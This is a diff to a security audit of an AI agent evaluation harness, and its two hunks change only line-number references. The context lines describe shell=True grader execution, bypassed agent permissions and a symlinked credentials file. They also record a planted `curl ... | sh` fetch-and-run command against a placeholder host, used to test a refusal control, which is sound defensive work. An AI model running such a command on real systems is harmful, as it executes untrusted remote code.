@@ -262,7 +262,7 @@ ship to consumers; it runs on the maintainer's machine.
 |---|---|
 | Trigger | Manual. `evals/README.md:122` gives `python3 evals/run_eval.py tasks --skill ... --model sonnet --parallel 5` |
 | Shell | Two kinds. `subprocess.run(..., shell=False)` for the `claude` subprocess (`:472`) and for git (`:873`, `:902`, `:903`, `:1046`, `:1192`, `:1200`, `:1561`, `:1562`, `:1579`). And `subprocess.run(command, shell=True, ...)` at `:814`-`:816`, where `command` is a grader string read from a suite's `assertions.json` |
-| Permissions requested of the agent under test | As audited: `--permission-mode bypassPermissions` whenever `--tools` was not passed, which was every task run. Since control 5: `bypassPermissions` plus the `TASK_TOOLS` allowlist at `:104`, applied through `RunPermissions` at `:300` and `:346`-`:351`, with the unbounded surface behind `--all-tools` (`:1402`, `:2180`). `--setting-sources project` keeps the caller's own settings out of both arms (`:335`) |
+| Permissions requested of the agent under test | As audited: `--permission-mode bypassPermissions` whenever `--tools` was not passed, which was every task run. Since control 5: `bypassPermissions` plus the `TASK_TOOLS` allowlist at `:104`, applied through `RunPermissions` at `:300` and `:346`-`:351`, with the unbounded surface behind `--all-tools` (`:1402`, `:2186`). `--setting-sources project` keeps the caller's own settings out of both arms (`:335`) |
 | Filesystem, outside the repository root | Yes, and it reaches a live credential. `:276` resolves `$CLAUDE_CONFIG_DIR/.credentials.json`, or `~/.claude/.credentials.json`, and `:279` symlinks it into the run's private home. A private HOME tree is created per run (`:263`-`:275`). `evals/.gitignore` records the consequence: "it contains a symlink to the credentials file that authenticates the run ... none of it may be pushed" |
 | Environment | `env = dict(os.environ)` (`:291`), so the run starts from the caller's full environment; `$EVAL_TOOL_BIN` is prepended to `PATH` (`:294`) |
 | Network egress | The Anthropic API, through `claude`. Plus whatever the graded agent chooses to do, which as audited was unconstrained, and is now what Bash can reach: `WebFetch` is off the `TASK_TOOLS` allowlist (`:104`). Plus whatever a fixture's own tooling fetches (`evals/README.md:109`-`:120` provisions `ansible-lint`, `zizmor`, `ansible-core`, `shellcheck`, `bats`) |
@@ -335,7 +335,7 @@ the grader-bearing files at `:656`, the suite's `assertions.json` and the harnes
 working tree rather than `HEAD` (`:711`), because a contributor's change reaches the shell the
 same way whether it was committed on a branch or applied as a patch. The refusal prints the
 `workspace_command` strings that are new or changed against the baseline (`:675`, `:689`), so the
-human decides with the commands in front of them, and `--graders-reviewed` (`:2158`) is the only
+human decides with the commands in front of them, and `--graders-reviewed` (`:2164`) is the only
 way past. Verified by planting `curl -s https://example.invalid/x | sh` into a suite: the run
 refused, named the file, and printed that command. The planted assertion was reverted.
 
